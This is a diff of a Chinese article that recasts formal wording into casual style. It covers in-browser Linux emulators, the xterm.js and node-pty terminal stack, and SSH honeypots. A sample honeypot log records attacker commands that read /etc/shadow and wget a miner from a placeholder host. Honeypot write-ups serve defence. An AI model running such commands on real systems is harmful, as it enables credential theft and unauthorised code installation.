   vga_bios:{ buffer: readFileSync("./bios/vgabios.bin") },
   hda:     { buffer: readFileSync("./images/alpine.img"), async: false },
-  memory_size: 128 * 1024 * 1024, // 128 MB
+  memory_size: 128 * 1024 * 1024, // 128M
   autostart: true,
 });
 
-// 捕获串口输出（Linux 内核控制台）
+// 抓串口输出（Linux 内核日志）
 emulator.add_listener("serial0-output-byte", byte => {
   process.stdout.write(String.fromCharCode(byte));
 });
 
-// 向访客发送输入（在 Shell 中打字）
+// 往客人送输入（在 shell 敲字）
 emulator.serial0_send("ls /\n");
 ```
 
-**支持的操作系统**：Alpine Linux（极佳）、Ubuntu 16.04/18.04（仅 i386）、Arch Linux 32、ReactOS、FreeDOS、Windows 9x/2000（有局限）、MS-DOS。
+**支持 OS**：Alpine Linux（极好）、Ubuntu 16.04/18.04（只 i386）、Arch Linux 32、ReactOS、FreeDOS、Windows 9x/2000（凑合）、MS-DOS。
 
-**启动时间**：从干净镜像启动 Alpine Linux 需要 15–40 秒。这是内核初始化的固有开销----你无法跳过。是的，你的用户会坐在那里看着内核启动序列在浏览器中滚动。这就是代价 xD
+**启动时间**：干净 Alpine 镜像 15-40 秒。真内核初始化，跳不过。对，用户看 Linux 内核在浏览器启动。就这 deal。
 
-**内存下限**：每个实例 100–256 MB。仅 Wasm JIT 代码缓存就可以在繁忙的 Linux 实例中达到几十 MB。
+**最小内存**：每实例 100-256M。忙 Linux 实例光 Wasm JIT 代码缓存几十 M。
 
-**Node.js 使用**：完全支持。不需要 DOM----如果你只关心串口，可以丢弃 VGA 输出。
+**Node.js 用**：全支持。DOM 不需要，只关心串口输出 VGA 扔了就行。
 
-**你不能做的事情**：运行 64 位二进制文件、使用现代内核特性（eBPF、io_uring 等）、或同时运行多个实例而不触及内存限制。
+**干不了**：64 位二进制、现代内核功能（eBPF、io_uring 等）、同时跑一把实例不碰内存墙。
 
-**npm**：[v86](https://www.npmjs.com/package/v86)----持续更新，到本文写作时最新版本就在昨天。
+**npm**：[v86](https://www.npmjs.com/package/v86)，持续更新，我写时当天刚发版。
 **GitHub**：[copy/v86](https://github.com/copy/v86)
 **演示**：[copy.sh/v86](https://copy.sh/v86)
 
 ---
 
-### 2.2 JSLinux 和 TinyEMU ---- Bellard 的作品，两次
+### 2.2 JSLinux 和 TinyEMU，Bellard 的活，分两次
 
-JSLinux 是 Fabrice Bellard 自己的 JavaScript Linux 仿真器----史上第一个，发布于 2011 年。我在这篇文章中反复提到 Bellard，就因为他一直在出现：QuickJS、TinyEMU、JSLinux、QEMU、FFmpeg。这个男人非同一般。毫不夸张地说，他是软件史上个人技术贡献最令人印象深刻的人物之一。
+JSLinux 是 Fabrice Bellard 的 JavaScript Linux 模拟器，2011 年首发，全场第一个。我这篇老提 Bellard 因为他老出现：QuickJS、TinyEMU、JSLinux、QEMU、FFmpeg。这人离谱，真的是软件史上个人技术贡献最离谱的之一，不夸张。
 
-最初的 JSLinux 是一个纯 JS x86 解释器。2016 年，Bellard 编写了 TinyEMU（一个 RISC-V 仿真器，用 C 语言），通过 Emscripten 编译为 JavaScript，这就成了当前 JSLinux 的基础。所以现在的 JSLinux 实际上是生成 JavaScript 的 C 代码----根本不是手工编写的 JS。
+最早 JSLinux 是纯 JS x86 解释器。2016 年 Bellard 写 TinyEMU（C 写的 RISC-V 模拟器），Emscripten 编 JavaScript，成了现在 JSLinux 底座。所以现在 JSLinux 是 C 生成的 JavaScript，一行手写 JS 没有。
 
-Bellard 网站上的技术说明值得一读：现在的 JSLinux 运行一个 32 或 64 位的 RISC-V CPU（不是 x86），仿真 VirtIO 控制台、VirtIO 网络、VirtIO 块设备和一个用于与主机共享文件的 9P 文件系统。JS 演示使用 Emscripten 从 C 编译----不是手工编写的 JS。
+Bellard 站上的技术笔记值得读：现在 JSLinux 跑 32 或 64 位 RISC-V CPU（不是 x86），VirtIO 串口控制台、网络、块设备、9P 文件系统和宿主共享文件。JS 演示从 C 经 Emscripten 编，不手写 JS。
 
-TinyEMU 本身支持：
-- RISC-V RV32IMAFDQC 和 RV64IMAFDQC（32 位和 64 位，带浮点、乘法和压缩指令）
-- 通过 KVM 支持 x86（仅原生模式，无仿真----所以 JS 版本仅支持 RISC-V）
-- VirtIO 控制台、网络、块设备、输入、9P 文件系统
+TinyEMU 自己支持：
+- RISC-V RV32IMAFDQC 和 RV64IMAFDQC（32 和 64 位，浮点、乘法、压缩指令）
+- x86 经 KVM（只原生，不是模拟，所以 JS 版只 RISC-V）
+- VirtIO 控制台、网络、块、输入、9P 文件系统
 
-TinyEMU 通过 Emscripten 提供了一个 JavaScript 演示。它是 JSLinux 的基础，也被 `container2wasm` 使用（见第 2.5 节）。
+TinyEMU 有经 Emscripten 的 JavaScript 演示。JSLinux 底座是它，`container2wasm` 也用它（2.5 节）。
 
-**JSLinux 状态**：没有 npm 包，没有可编程 API。它是在浏览器中打开的演示。历史意义重大----它证明了概念的可行性。作为库的实际用途：无。
+**JSLinux 状态**：没 npm 包，没可编程 API。浏览器打开的演示。历史意义大，库实用价值零。
 
-**TinyEMU**：不在 npm 上，C 源码在 [bellard.org/tinyemu](https://bellard.org/tinyemu/)。
-
----
-
-### 2.3 jor1k ---- OR1K 仿真器
-
-jor1k 是 Sebastian Macke 用 JavaScript 编写的 OpenRISC 1000（OR1K）仿真器。它在历史上意义重大，因为 jor1k 引入了 VirtIO 9P 文件系统支持，Bellard 后来将其整合到 TinyEMU 和 JSLinux 中。这些项目之间的交叉授粉非常紧密----它们互相借鉴，说实话，这是开源仿真工作最酷的地方之一。
-
-**状态**：不再积极维护，没有 npm 包。目前已经归档。主要值得从历史角度了解一下----如果有人提起 jor1k，现在你知道它是什么了 :)
+**TinyEMU**：没 npm，C 源码在 [bellard.org/tinyemu](https://bellard.org/tinyemu/)。
 
 ---
 
-### 2.4 CheerpX ---- 面向浏览器的商业 x86 仿真器
+### 2.3 jor1k，OR1K 模拟器
 
-Leaning Technologies 的 CheerpX 是商业级、面向生产环境的 x86 Linux 仿真器。它不是开源的，但在运行真实的 Debian/Ubuntu 用户态方面比 v86 强大得多。如果你需要在浏览器中运行真正的 VSCode，这就是你要用的。
+jor1k 是 Sebastian Macke 写的 JavaScript OpenRISC 1000（OR1K）模拟器。历史上有意思因为 jor1k 首创 VirtIO 9P 文件系统支持，Bellard 拿去并进 TinyEMU 和 JSLinux。项目之间交叉借东西很密，说实话开源模拟器圈最酷的事之一。
 
-与 v86 的主要区别：
-- 支持更广泛的 ISA（更多 x86 扩展、更好的 glibc 兼容性）
-- 浏览器的基于 IndexedDB 的文件系统（页面刷新后持久化）
-- 通过 `SharedArrayBuffer` 支持 pthread（需要 COOP/COEP 头----就是那些烦人的安全头）
-- 设计用于运行 VSCode、Python、Node.js 和其他真实应用，而不仅仅是最小化 OS 镜像
-- 提供专业支持和 SLA（说白了就是出问题了你可以找他们）
+**状态**：不积极维护，没 npm 包。这时候归档了。知道有这东西就行，哪天有人饭桌提 jor1k 你接得上 :)
 
-典型用例是"在浏览器中运行真正的 Linux 应用，无需服务器"。公司用它来构建基于浏览器的 IDE、编程教程和交互式文档。
+---
+
+### 2.4 CheerpX，浏览器商用 x86 模拟器
+
+CheerpX 是 Leaning Technologies 的商用生产级 Linux x86 模拟器。不开源，但跑真 Debian/Ubuntu 用户态比 v86 能打得多。浏览器跑真 VSCode 找它。
+
+和 v86 关键区别：
+- ISA 更宽（更多 x86 扩展，glibc 兼容更好）
+- 文件系统走浏览器 IndexedDB（刷新不丢）
+- pthread 经 `SharedArrayBuffer`（要 COOP/COEP 头，对讨厌的安全头）
+- 为跑真应用设计：VSCode、Python、Node.js 等，不只最小 OS 镜像
+- 有专业支持和 SLA（aka 出事能找人骂）
+
+典型场景"浏览器跑真 Linux 应用，不搭服务器。"拿它做浏览器 IDE、代码教程、交互文档的公司不少。
 
 ```js
-// CheerpX API（简化版）
+// CheerpX API（简化）
 const cx = await CheerpX.Linux.create({
   mounts: [{ type: "ext2", path: "/", dev: CloudDevice.create(...) }],
 });
 await cx.run("/bin/bash");
 ```
 
-**Node.js 的故事**：CheerpX 以浏览器为先。底层仿真器理论上可能在 Node 中工作（它是 Wasm），但 API 和文档完全面向浏览器使用。服务端使用不受支持。
+**Node.js 故事**：首先给浏览器设计。底下模拟器理论 Node 能跑（Wasm 的），但 API 文档全按浏览器用写。服务端用不支持。
 
-**内存**：与 v86 类似----真实 Debian 实例需要 200+ MB。
-**定价**：开源项目免费，生产 SaaS 需要商业许可。
+**内存**：和 v86 相近，真 Debian 实例 200M 起。
+**价格**：开源项目免费，生产 SaaS 商业许可。
 **文档**：[cheerpx.io/docs/overview](https://cheerpx.io/docs/overview)
 
 ---
 
-### 2.5 WebContainers（StackBlitz）---- Wasm 中的 Node.js，而非 Linux 仿真
+### 2.5 WebContainers（StackBlitz），Wasm 里的 Node.js，不是 Linux 模拟
 
-WebContainers 经常被归入 Linux 仿真器，但架构完全不同。它们不仿真 x86。它们不启动 Linux。它们运行使用 WASI 编译为 WebAssembly 的 Node.js。这个区别非常重要，我自己也困惑了很久，哈哈。
+WebContainers 老被和 Linux 模拟器放一堆，但架构不同。不模拟 x86。不起 Linux。Node.js 编 WebAssembly 跑 WASI。这区别很大，我为此糊涂超久。
 
-我觉得混淆来自营销措辞----"在浏览器中运行 Node.js"听起来像是在仿真，但实际上它是 Node.js 本身编译为 Wasm，而不是在虚拟机内运行 Node.js 的 Linux 仿真。完全不同的事情。
+我觉得 confusion 来自营销，"浏览器跑 Node.js"听着像模拟，实际 Node.js 自己编 Wasm，不是模拟 Linux 跑里面 Node.js。两套完全不同的架构。
 
-架构是：
-1. Node.js 编译为 Wasm（具体来说是自定义 WASI 运行时）
-2. Service Worker 拦截来自仿真的 Node.js 服务器的网络请求，并将其路由到浏览器标签页
-3. 文件系统存在于浏览器内存中（无磁盘 I/O）
-4. npm 是针对浏览器内使用优化的自定义实现
+架构：
+1. Node.js 编 Wasm（定制 WASI 运行时专版）
+2. Service Worker 拦截模拟 Node 服务器的网络请求，路由回浏览器标签
+3. 文件系统在浏览器内存（无磁盘 I/O）
+4. npm 是给浏览器优化的定制实现
 
 ```js
 import { WebContainer } from "@webcontainer/api";
@@ -412,77 +411,76 @@ await webcontainer.mount({
   "package.json": { file: { contents: `{"name":"demo","type":"module"}` } }
 });
 
-// 运行 Node.js 命令
+// 跑 Node.js 命令
 const proc = await webcontainer.spawn("node", ["index.js"]);
 proc.output.pipeTo(new WritableStream({ write: chunk => console.log(chunk) }));
 ```
 
-因为它运行真正的 Node.js（Wasm 编译版），你有真正的 npm、真正的 Node.js API 和真正的模块解析。但你得不到通用的 Linux 用户态----你不能用 `apt` 安装系统包、运行任意编译的二进制文件，或者在 Node.js 生态系统之外做很多事情。
+跑真 Node.js（编 Wasm 的），真 npm、真 Node API、真模块解析。没有通用 Linux 用户态，`apt` 装不了系统包，任意编译二进制跑不了，Node.js 生态之外基本干不了啥。
 
-**浏览器要求**：SharedArrayBuffer（需要 COOP/COEP 头）、Service Worker 支持、现代 Wasm。
+**浏览器前提**：SharedArrayBuffer（要 COOP/COEP 头）、Service Worker 支持、现代 Wasm。
 
-**Node.js 的故事**：专为浏览器使用设计。API 在浏览器上下文之外无法工作。
+**Node.js 故事**：只给浏览器设计。API 浏览器上下文之外跑不了。
 
 **npm**：[@webcontainer/api](https://www.npmjs.com/package/@webcontainer/api)
 **文档**：[webcontainers.io](https://webcontainers.io)
 
 ---
 
-### 2.6 container2wasm ---- 编译到 Wasm 的 Docker 容器
+### 2.6 container2wasm，Docker 容器编 Wasm
 
-`container2wasm` 是 NTT 的一个工具（不是 npm 包），它接受一个 Docker 容器镜像并将其转换为一个 WebAssembly 二进制文件，可以在任何 Wasm 宿主中运行----包括浏览器。我第一次看到的时候真的不敢相信它能工作。
+`container2wasm` 是工具（不是 npm 包），NTT 出的，把 Docker 容器镜像转 WebAssembly 二进制，任何 Wasm 宿主跑，包括浏览器。第一次见我是真不信能跑。
 
 机制：
-- 对于 x86_64 容器：嵌入 Bochs（一个 x86 仿真器，编译为 Wasm）+ 容器的根文件系统
-- 对于 riscv64 容器：嵌入 TinyEMU（又是 Bellard！）+ 容器的根文件系统
-- 生成的 `.wasm` 文件启动仿真器、挂载容器文件系统并运行容器的入口点
+- x86_64 容器：包 Bochs（x86 模拟器，编 Wasm）加容器 rootfs
+- riscv64 容器：包 TinyEMU（又是 Bellard！）加容器 rootfs
+- 出来 `.wasm` 起模拟器，挂容器文件系统，跑容器入口
 
 ```bash
-# 将 Ubuntu 22.04 容器转换为 Wasm
+# Ubuntu 22.04 容器转 Wasm
 c2w ubuntu:22.04 out.wasm
 
-# 运行它
+# 跑
 wasmtime out.wasm uname -a
 # Linux 5.15.0 #1 SMP riscv64 GNU/Linux
 
-# 或者为浏览器使用提供 HTTP 服务
+# 或 serve 给浏览器用
 c2w --to-js ubuntu:22.04 /tmp/htdocs/
 ```
 
-生成的 `.wasm` 很大----最小化的 Ubuntu 也有几百 MB----但它是完全自包含的。你可以通过邮件发给别人一个 `.wasm` 文件，他们就能在浏览器中运行 Ubuntu。这句话理论上说不通，但事实就是如此。
+出来 `.wasm` 巨大，最小 Ubuntu 几百 M，但完全自包含。邮件发人 `.wasm` 对方浏览器跑 Ubuntu。这话本不该通顺但现在通了。
 
 **GitHub**：[container2wasm/container2wasm](https://github.com/container2wasm/container2wasm)
 
 ---
 
-### 仿真器家族总结
+### 模拟器家族总结
 
 | | `v86` | JSLinux/TinyEMU | jor1k | CheerpX | WebContainers | container2wasm |
 |---|---|---|---|---|---|---|
-| **架构** | x86-32 JIT→Wasm | RISC-V (Wasm) | OR1K (JS) | x86（专有） | Node.js→Wasm/WASI | x86/RISC-V (Wasm) |
-| **真实内核** | ✅ | ✅ | ✅ | ✅ | ❌ (Node.js) | ✅ |
-| **64 位** | ❌ | ✅ (RISC-V) | ❌ | ✅ | 不适用 | ✅ |
+| **架构** | x86-32 JIT→Wasm | RISC-V（Wasm） | OR1K（JS） | x86（专有） | Node.js→Wasm/WASI | x86/RISC-V（Wasm） |
+| **真内核** | ✅ | ✅ | ✅ | ✅ | ❌（Node.js） | ✅ |
+| **64 位** | ❌ | ✅（RISC-V） | ❌ | ✅ | 无 | ✅ |
 | **npm 包** | ✅ | ❌ | ❌ | CDN/API | ✅ | ❌（CLI 工具） |
-| **Node.js 使用** | ✅ | ❌ | ❌ | ❌ | ❌（仅浏览器） | 通过 Wasmtime |
-| **浏览器使用** | ✅ | ✅ | ✅ | ✅ | ✅ | ✅ |
-| **每实例 RAM** | 150–256 MB | ~64–128 MB | ~64 MB | 200+ MB | ~100 MB | ~200–500 MB |
-| **启动时间** | 15–40 秒 | 10–30 秒 | 10–30 秒 | 15–40 秒 | 2–5 秒 | 10–40 秒 |
+| **Node.js 用** | ✅ | ❌ | ❌ | ❌ | ❌（只浏览器） | 经 Wasmtime |
+| **浏览器用** | ✅ | ✅ | ✅ | ✅ | ✅ | ✅ |
+| **内存/实例** | 150-256M | 约 64-128M | 约 64M | 200M 起 | 约 100M | 约 200-500M |
+| **启动** | 15-40 秒 | 10-30 秒 | 10-30 秒 | 15-40 秒 | 2-5 秒 | 10-40 秒 |
 | **开源** | ✅ | ✅ | ✅ | ❌ | 部分 | ✅ |
-| **状态** | ✅ 非常活跃 | ✅ 稳定 | ⚠️ 已归档 | ✅ 商业产品 | ✅ 活跃 | ✅ 活跃 |
+| **状态** | ✅ 很活跃 | ✅ 稳定 | ⚠️ 归档 | ✅ 商用 | ✅ 活跃 | ✅ 活跃 |
 
-从表中可以看出：`v86` 是唯一同时具备 npm 包、可在浏览器和 Node 中运行且开源的方案。这就是为什么它在"JavaScript Linux 仿真器"的讨论中占据主导地位。其他所有方案都有各自的短板----JSLinux 没有 API、jor1k 已归档、CheerpX 要花钱、WebContainers 仅限浏览器且绑定 Node.js、container2wasm 需要构建步骤和 CLI。如果你只是需要"在 JavaScript 中启动 Linux"，`v86` 几乎总是正确的起点。
-
+这表一眼结论：`v86` 是唯一同时 npm 包、浏览器 Node 通吃、开源的。所以"JavaScript 跑 Linux 模拟器"话题它统治。别的全有短板，JSLinux 没 API，jor1k 归档，CheerpX 收钱，WebContainers 只浏览器只 Node，container2wasm 要构建加 CLI。就要"JavaScript 起 Linux"，`v86` 几乎永远是起点。
 ---
 
-## 第 3 部分----终端栈：xterm.js 和 node-pty
+## 第 3 部分，终端栈：xterm.js 和 node-pty
 
-有两个包在人们构建类似 Shell 的体验时频繁出现。它们不是沙箱或仿真器----它们是 UI 和 PTY 管道----但它们关系如此密切，不提到它们我会过意不去。而且我都用过，它们真的很棒。
+做类 shell 体验这两个包老出现。不是沙箱不是模拟器，是 UI 和 PTY 管道，但相关到不提难受。而且我两个都用过，都真好用。
 
-### 3.1 `xterm.js` ---- 终端渲染器
+### 3.1 `xterm.js`，终端渲染
 
-xterm.js 是一个面向浏览器的终端仿真器。它在 `<canvas>` 元素中渲染终端屏幕（VT100/xterm 转义序列），处理键盘输入，并暴露出一个用于管道输入输出的 API。
+xterm.js 是浏览器终端模拟器。`<canvas>` 里画终端屏（VT100/xterm 转义序列），管键盘输入，暴露接后端数据的 API。
 
-使用者：VS Code 的内置终端、Azure Cloud Shell、Proxmox VE、AWS CloudShell 等。
+用它：VS Code 内置终端、Azure Cloud Shell、Proxmox VE、AWS CloudShell 等等。
 
 ```js
 import { Terminal } from "@xterm/xterm";
@@ -494,28 +492,28 @@ term.loadAddon(fitAddon);
 term.open(document.getElementById("terminal"));
 fitAddon.fit();
 
-// 发送数据到终端（渲染为文字）
+// 往终端送数据（显示成字）
 term.write("$ ");
 term.onData(data => {
-  // data 是按键输入----发送到你的后端
+  // data 是按键，发后端
   socket.send(data);
 });
 socket.onmessage(msg => {
-  // 来自后端的输出----显示出来
+  // 后端输出，显示
   term.write(msg.data);
 });
 ```
 
-xterm.js 仅仅是渲染层。它不运行 Shell。它不解释命令。它是一个显示组件，让你连接到任何你想要的后端。很多人以为 xterm.js "就是终端"，但它真的只是屏幕----你仍然需要把它连接到实际运行命令的东西上。
+xterm.js 只管渲染层。不跑 shell。不解释命令。显示 widget，接你选的后端。很多人以为 xterm.js"就是终端"，其实它只是屏幕，跑命令的东西另接。
 
 **npm**：[@xterm/xterm](https://www.npmjs.com/package/@xterm/xterm)
 **GitHub**：[xtermjs/xterm.js](https://github.com/xtermjs/xterm.js)
 
 ---
 
-### 3.2 `node-pty` ---- PTY 生成
+### 3.2 `node-pty`，PTY 创建
 
-`node-pty` 在 Node.js 中生成一个伪终端（PTY），并给你一个读/写句柄。与 xterm.js 配合使用，你可以构建一个与服务器上真实 Shell（bash、zsh、fish）对话的浏览器终端。
+`node-pty` 在 Node.js 建伪终端（PTY），给你读写 handle。和 xterm.js 配，浏览器终端连服务器真 shell（bash、zsh、fish）。
 
 ```js
 import * as pty from "node-pty";
@@ -529,44 +527,44 @@ const shell = pty.spawn("bash", [], {
 });
 
 shell.onData(data => {
-  // 通过 WebSocket 发送到浏览器的 xterm.js
+  // 经 WebSocket 发浏览器 xterm.js
   ws.send(data);
 });
 
 ws.on("message", data => {
-  // 将浏览器按键输入转发给 Shell
+  // 浏览器按键传 shell
   shell.write(data);
 });
 ```
 
-这是云 IDE 和 Web 终端的标准模式：xterm.js（浏览器）↔ WebSocket ↔ node-pty ↔ 真实 bash。无隔离。Shell 以 Node.js 进程的完整权限运行（或者说运行它的任何用户的权限）。
+云 IDE 和网页终端标准方案：xterm.js（浏览器）↔ WebSocket ↔ node-pty ↔ 真 bash。隔离零。shell 拿 Node.js 进程（或起它用户）全部权限跑。
 
-**维护者**：微软。
+**维护**：微软。
 **npm**：[node-pty](https://www.npmjs.com/package/node-pty)
 **GitHub**：[microsoft/node-pty](https://github.com/microsoft/node-pty)
 
 ---
 
-## 第 4 部分----SSH 蜜罐
+## 第 4 部分，SSH 蜜罐
 
-蜜罐的设计初衷就是被攻击。目标是看起来足够逼真，让攻击者与之交互，同时记录他们所做的一切用于威胁情报。SSH 是主要目标，因为它是互联网上受攻击最多的服务----如果你在公共 IP 上暴露端口 22，几分钟内就会看到自动扫描尝试。你可以试试看，速度之快令人震惊。
+蜜罐为被攻击而生。目标是装够真，攻击者进来玩，顺手全记录。SSH 是头号目标因为它是网上被扫最多的服务，公网 IP 开 22 端口几分钟内见自动扫描。字面几分钟。有天试试，看看来得多快，吓人。
 
-蜜罐的质量由两个指标衡量：**保真度**（它冒充真实系统的可信度）和**遥测**（它捕获的有用数据量）。这两者是矛盾的。高保真度的蜜罐更难构建，运维风险也更高。
+蜜罐质量看两样：**逼真度**（装真系统装多像，攻击者识不识破）和**遥测**（抓多少有用数据）。两样互掐。高逼真难建，跑着风险大。
 
-正是这一节最终引导我构建了 `typescript-virtual-container` 中的 `HoneyPot` 模块，所以对此我有一些观点。
+这节最终逼我给 `typescript-virtual-container` 写 `HoneyPot` 模块，所以我有点 opinions。
 
-### 4.1 Cowrie ---- 黄金标准
+### 4.1 Cowrie，标杆
 
-Cowrie 是一个基于 Python 的中等到高交互度的 SSH 和 Telnet 蜜罐。它是研究和安全社区中部署最广泛的 SSH 蜜罐。
+Cowrie 是 Python 写的 SSH 和 Telnet 中高交互蜜罐。研究和安全圈部署最多的 SSH 蜜罐。
 
 架构：
-- **协议层**：真实的 SSH 协议实现（Twisted Conch），所以攻击者获得真实的握手、真实的密钥交换、真实的认证
-- **Shell 层**：一个伪造的文件系统（模拟 Debian 5.0）和一个对常见命令做出响应的部分 Shell 解释器
-- **代理模式**：可以转发到后方的真实系统（高交互模式），记录流经的一切
-- **LLM 模式**（最新添加）：使用语言模型对未知命令生成动态响应----是的，Cowrie 现在有了 AI 模式。疯狂的时代。
+- **协议层**：真 SSH 协议实现（Twisted Conch），攻击者拿到真握手、真密钥交换、真认证
+- **shell 层**：假文件系统（长得像 Debian 5.0）加残 shell 解释器，回常见命令
+- **代理模式**：后面挂真系统（高交互模式），流量全录
+- **LLM 模式**（新加）：调语言模型动态回它不会的命令，对 Cowrie 都有 AI 模式了。疯时代。
 
 ```python
-# Cowrie 捕获的内容
+# Cowrie 抓什么
 {
   "timestamp": "2024-01-15T03:22:11.847Z",
   "src_ip": "45.33.32.156",
@@ -584,76 +582,76 @@ Cowrie 是一个基于 Python 的中等到高交互度的 SSH 和 Telnet 蜜罐�
 }
 ```
 
-Cowrie 保存下载的文件（通过 wget/curl/SFTP/SCP）用于恶意软件分析。它与 Splunk、Elasticsearch 及其他 SIEM 平台集成。
+Cowrie 存攻击者下的文件（经 wget/curl/SFTP/SCP），做恶意软件分析。接 Splunk、Elasticsearch 等 SIEM。
 
-**保真度**：中高。足以骗过自动化的机器人（这是 99% 的 SSH 攻击者----大部分只是尝试 `root`/`password` 的傻瓜脚本）。但有经验的人类可以识别它，通常很快就能识破。
+**逼真度**：中高。骗自动 bot 够了（99% SSH 攻击者就是试 `root`/`password` 的蠢脚本）。老练人类能指纹识破，一般挺快。
 
 **语言**：Python（Twisted）
 **GitHub**：[cowrie/cowrie](https://github.com/cowrie/cowrie)
 
 ---
 
-### 4.2 Kippo ---- Cowrie 的前身
+### 4.2 Kippo，Cowrie 前身
 
-Kippo 是原始的中等交互度 SSH 蜜罐，Cowrie 就是基于它开发的。基本思路相同：真实的 SSH 协议、伪造的文件系统、部分 Shell。Cowrie 已经完全取代了它----Kippo 已经归档，2026 年没人应该再运行它了。这里提到它纯粹是为了历史的完整性，因为你可能在旧的博客文章和安全论文中看到它的引用。
+Kippo 是 Cowrie 基于的原版中交互 SSH 蜜罐。同思路：真 SSH 协议，假文件系统，残 shell。Cowrie 全面超了它，Kippo 归档，2026 年谁都不该用。纯历史完整提一嘴，老博客和安全论文还引用它。
 
-**GitHub**：[desaster/kippo](https://github.com/desaster/kippo) ---- 已归档
+**GitHub**：[desaster/kippo](https://github.com/desaster/kippo)，已归档
 
 ---
 
-### 4.3 endlessh ---- SSH 拖拽陷阱
+### 4.3 endlessh，SSH tarpit
 
-endlessh 是一个退化型的蜜罐：它以每秒 1 字节（或更慢）的速度缓慢发送 banner 数据来保持 SSH 连接开放。连接到它的 SSH 客户端将无限期挂起----因为服务器从未完成发送 banner，所以永远无法进入认证阶段。
+endlessh 是退化蜜罐：SSH 连接吊着，banner 一秒一字节（或更慢）慢慢发。连上的客户端永远卡住，到不了认证因为服务器发不完 banner。
 
-目标不是威胁情报，而是纯粹的资源消耗：占用攻击者扫描器的线程，让他们无法快速攻击真正的目标。说实话，这是一种近乎恶意的、但极其巧妙的方式。你不是从攻击者那里获取任何信息----你只是在浪费他们的时间。这当中蕴含着深深的满足感。
+目的不是威胁情报，是纯资源拒绝：占攻击者扫描线程，让它们慢点够到真目标。说实话有点损但爽。攻击者啥都学不到，纯烧它时间。莫名解气。
 
 ```c
-// endlessh 的整个协议行为：
-// 发送："SSH-2.0-OpenSSH_" 然后慢慢追加随机字符
-// 从不关闭连接
-// 攻击者扫描器在 N 秒后超时
+// endlessh 全部协议行为：
+// 发："SSH-2.0-OpenSSH_" 然后慢慢加随机字符
+// 永不断连接
+// 攻击者扫描器 N 秒后超时
 ```
 
-不捕获命令。不测试认证。只是消耗连接时间。
+命令不抓。认证不测。纯耗连接时间。
 
-**编程语言**：C
+**语言**：C
 **GitHub**：[skeeto/endlessh](https://github.com/skeeto/endlessh)
 
 ---
 
-### 4.4 sshesame ---- "放所有人进来"的蜜罐
+### 4.4 sshesame，"全放行"蜜罐
 
-sshesame 接受所有 SSH 连接（任何用户名、任何密码、任何密钥）并记录一切。它是一个零交互蜜罐：不响应命令，只是让攻击者"进来"并记录他们输入的每个按键。
+sshesame 全接受 SSH 连接（任何用户、任何密码、任何密钥），全记录。零交互蜜罐：不回命令，放攻击者"进来"，按键全记。
 
 ```
-2024-01-15 03:22:11 Connection from 45.33.32.156
-  Username: root, Password: password123 -- accepted
-  Commands typed:
+2024-01-15 03:22:11 45.33.32.156 连入
+  用户：root，密码：password123，已接受
+  敲的命令：
     cat /etc/shadow
     wget http://malicious.example/miner
     uname -a
-  Disconnected after 47s
+  47 秒后断开
 ```
 
-对于凭据收集很有用：你可以快速积累机器人尝试的用户名和密码，从而了解当前哪些默认凭据正在被暴力破解。剧透警告：永远是 `root`/`password`、`admin`/`admin` 和 `root`/`123456`。每次都是。
+收凭证神器：很快攒出 bot 在爆破的用户名密码，知道哪些默认口令正被打。剧透：永远 `root`/`password`、`admin`/`admin`、`root`/`123456`。每次都。
 
 **GitHub**：[jaksi/sshesame](https://github.com/jaksi/sshesame)
 
 ---
 
-### 4.5 Lyrebird ---- 基于 Docker 的蜜罐框架
+### 4.5 Lyrebird，Docker 蜜罐框架
 
-`lyrebird/honeypot-base` 是一个用于构建网络服务蜜罐的 Docker 基础镜像。它不专门针对 SSH----它是一个构建任何协议蜜罐的框架。
+`lyrebird/honeypot-base` 是搭网络服务蜜罐的 Docker 基镜像。不是专门 SSH 蜜罐，是搭任何协议蜜罐的框架。
 
-基础镜像提供了日志框架、协议插件系统和用于多服务蜜罐的 Docker Compose 配置。
+基镜像给日志框架、协议插件系统、多服务蜜罐 Docker Compose 配置。扩展去仿具体服务。
 
 **Docker Hub**：[lyrebird/honeypot-base](https://hub.docker.com/r/lyrebird/honeypot-base/)
 
 ---
 
-### 4.6 在 Node.js 中构建 SSH 蜜罐 ---- 朴素方法及其失败原因
+### 4.6 Node.js 手搭 SSH 蜜罐，天真版，和它为什么挂
 
-在 `typescript-virtual-container` 之前，在 Node.js 中构建 SSH 蜜罐意味着将真正的 `ssh2` 库与手动命令伪造结合起来。非常繁琐、非常不完整，但……这几乎是一种成人仪式了：
+`typescript-virtual-container` 之前，Node.js 搭 SSH 蜜罐就是真 `ssh2` 库加手写命令模拟。又累又残又不全，但……必经之路，这时候：
 
 ```js
 import { Server } from "ssh2";
@@ -664,9 +662,9 @@ const hostKey = readFileSync("./host.key");
 
 new Server({ hostKeys: [hostKey] }, client => {
   client.on("authentication", ctx => {
-    // 记录尝试
+    // 记尝试
     appendFileSync("creds.log", `${ctx.username}:${ctx.credentials?.password}\n`);
-    ctx.accept(); // 放所有人进来
+    ctx.accept(); // 全放行
   });
 
   client.on("ready", () => {
@@ -679,7 +677,7 @@ new Server({ hostKeys: [hostKey] }, client => {
         stream.on("data", data => {
           const cmd = data.toString().trim();
           appendFileSync("commands.log", `${cmd}\n`);
-          // 伪造响应
+          // 模拟回复
           if (cmd === "uname -a") {
             stream.write("\r\nLinux ubuntu 5.15.0-91-generic #101-Ubuntu x86_64 GNU/Linux\r\n");
           } else {
@@ -693,90 +691,89 @@ new Server({ hostKeys: [hostKey] }, client => {
 }).listen(2222);
 ```
 
-这种方法在"捕获凭据和命令"的意义上是"可行的"。但一旦遇到老练的攻击者，它显然是假的。`uname -a` 返回正确的字符串，但 `ls /etc` 返回"command not found"----立刻就暴露了。文件系统不存在。命令不能链式执行。管道不能用。变量不会展开。
+"能跑"在能抓凭证抓命令。但老练攻击者一深就穿帮。`uname -a` 回对串，`ls /etc` 回"command not found"，骗谁。文件系统没有。命令串不起来。管道不通。变量不展开。
 
-一个熟练的攻击者在头五个命令内就能识别出你的蜜罐。检查类似 Cowrie 行为的自动化脚本也会立刻检测到它。这显然就是推动 `typescript-virtual-container` 作者去构建一个真正解释命令的东西的原因----更多内容在第 5 部分。
+能干的攻击者五条命令识破你蜜罐。找 Cowrie 味的自动脚本也立刻识破。据说这逼 `typescript-virtual-container` 作者去建真解释命令的东西，下面第 5 部分。
 
 ---
 
 ### 蜜罐家族总结
 
-| | Cowrie | Kippo | endlessh | sshesame | Lyrebird | 朴素 ssh2 |
+| | Cowrie | Kippo | endlessh | sshesame | Lyrebird | 天真 ssh2 |
 |---|---|---|---|---|---|---|
